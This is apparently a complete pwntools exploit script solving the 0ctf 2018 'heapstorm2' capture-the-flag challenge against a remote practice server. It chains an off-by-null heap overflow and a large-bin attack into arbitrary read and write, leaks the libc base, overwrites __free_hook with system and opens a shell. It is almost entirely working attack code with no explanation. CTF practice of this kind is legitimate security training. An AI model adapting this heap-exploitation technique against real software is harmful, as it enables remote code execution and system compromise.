from pwn import *

#context.log_level = 'debug'

libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(size):
    sla(b'Command: ', b'1')
    sla(b'Size: ', str(size).encode())

def edit(index, content):
    sla(b'Command: ', b'2')
    sla(b'Index: ', str(index).encode())
    sla(b'Size: ', str(len(content)).encode())
    sa(b'Content: ', content)

def delete(index):
    sla(b'Command: ', b'3')
    sla(b'Index: ', str(index).encode())

def show(index):
    sla(b'Command: ', b'4')
    sla(b'Index: ', str(index).encode())

def exp():
    alloc(0x18) #0
    alloc(0x508)#1
    alloc(0x18) #2

    edit(1, b'a' * 0x4f0 + p64(0x500))

    alloc(0x18) #3
    alloc(0x508)#4
    alloc(0x18) #5

    edit(4, b'a' * 0x4f0 + p64(0x500))

    alloc(0x18) #6

    delete(1) #1 -> unsorted bin

    edit(0, b'a' * ( 0x18 - 12 )) #off by null, 0x511 -> 0x500, so that we can keep inuse with 0

    alloc(0x18) #1
    alloc(0x4d8) #7

    delete(1)
    delete(2)

    alloc(0x38) #1, overlap to chunk 7
    alloc(0x4e8) #2

    delete(4)
    edit(3, b'a' * ( 0x18 - 12 )) #off by null

    alloc(0x18) #4
    alloc(0x4d8) #8

    delete(4)
    delete(5)

    alloc(0x48) #4, overlap to chunk 8

    delete(2) #triger chunk to unsorted bin
    alloc(0x4e8) #one chunk to large bin
    delete(2)

    heaparray = 0x13370000 + 0x800
    fake_chunk = heaparray - 0x20

    payload = b'a' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
    edit(7, payload)

    payload = b'a' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk + 8)
    payload += p64(0) + p64(fake_chunk - 0x18 - 5)
    edit(8, payload)

    alloc(0x48) #2
    edit(2, p64(0) * 5 + p64(0x13377331) + p64(heaparray))

    payload = p64(0) * 3 + p64(0x13377331) + p64(heaparray) + p64(0x1000) + p64(heaparray - 0x20 + 3) + p64(8)
    edit(0, payload)

    show(1)
    ru(b']: ')
    chunk = u64(rv(8))
    success('chunk -> {}'.format(hex(chunk)))

    chunk_fd = chunk + 0x10
    payload = p64(0) * 3 + p64(0x13377331) + p64(heaparray) + p64(0x1000) + p64(chunk_fd) + p64(8)
    edit(0, payload)

    show(1)
    ru(b']: ')
    libc_base = u64(rv(8)) - 0x68 - libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    success('libc_base -> {}'.format(hex(libc_base))) 

    payload = p64(0) * 4 + p64(heaparray) + p64(0x1000) + p64(free_hook) + p64(8 + 12)
    payload += p64(heaparray + 0x48) + b'/bin/sh\x00'
    edit(0, payload)

    edit(1, p64(system))

    delete(2)
    
    p.interactive()

if __name__ == "__main__":
    while True:
        try:
            #p = process('./0ctf_2018_heapstorm2')
            p = remote('node4.buuoj.cn', 28952)
            exp()
            break
        except:
            p.close()
